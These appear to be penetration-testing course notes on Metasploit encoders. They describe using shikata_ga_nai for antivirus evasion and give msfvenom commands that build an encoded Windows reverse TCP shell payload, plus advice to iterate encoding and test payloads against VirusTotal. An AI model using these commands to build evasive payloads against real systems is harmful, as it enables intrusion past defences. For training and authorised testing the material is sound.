Encoders have assisted with making payloads compatible with different processor architectures while helping with antivirus evasion. Architectures include `x64, x86, sparc, ppc, mips`. They are also needed to remove hexadecimal opcodes aka bad characters from the payload. 

Encoding the payload in different formats could help with AV detection, but it has improved software. The Shikata Ga Nai (SGN) is one of the most utilized encoding and its so hard to detect that payloads encoded through are universally undetectable. The name means `nothing can be done about it`.  
[Read more about Shikata Ga Nai](https://cloud.google.com/blog/topics/threat-intelligence/shikata-ga-nai-encoder-still-going-strong/)

**Selecting an Encoder**

One can use the `msfvenom` tool to create payloads and add the `-e` tag to add a custom encoder preferably the `shikata_ga_nai` would be the best option. 

```shell-session
workstation@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

workstation@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Also another tangible idea is to pass through the encoder multiple iterations and you can always use the online virus total or the `msf-virustotal` tool to analyze our payloads and check if they are able to evade any antiviruses.  